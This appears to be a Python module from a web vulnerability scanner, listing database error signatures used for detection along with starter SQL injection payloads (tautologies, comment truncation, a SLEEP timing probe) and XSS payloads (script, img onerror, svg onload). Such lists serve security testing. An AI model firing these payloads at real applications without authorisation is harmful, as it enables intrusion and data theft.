# scanner/signatures.py
import re

# SQL error signatures (expand as needed)
SQL_ERRORS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_",
    r"Unclosed quotation mark after the character string",
    r"Microsoft OLE DB Provider for SQL Server",
    r"PG::SyntaxError",
    r"SQLite.Exception",
    r"syntax error at or near",
]

SQL_ERRORS_RE = re.compile("|".join("(" + s + ")" for s in SQL_ERRORS), re.IGNORECASE)

# Payload lists (starter)
SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 -- ",
    "\" OR \"\" = \"",
    "'; -- ",
    "' OR SLEEP(5)--",
]

XSS_PAYLOADS = [
    "<script>alert('x')</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
]
